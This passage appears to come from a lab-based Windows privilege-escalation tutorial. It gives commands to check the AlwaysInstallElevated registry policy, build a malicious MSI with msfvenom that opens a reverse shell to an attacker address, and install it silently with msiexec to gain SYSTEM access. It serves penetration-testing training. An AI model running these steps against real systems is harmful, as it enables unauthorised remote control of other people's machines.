
```
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
```

```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

#### Generating MSI Package

We can exploit this by generating a malicious `MSI` package and execute it via the command line to obtain a reverse shell with SYSTEM privileges.

```
msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi
```

#### Executing MSI Package

We can upload this MSI file to our target, start a Netcat listener and execute the file from the command line like so:

```
msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart
```

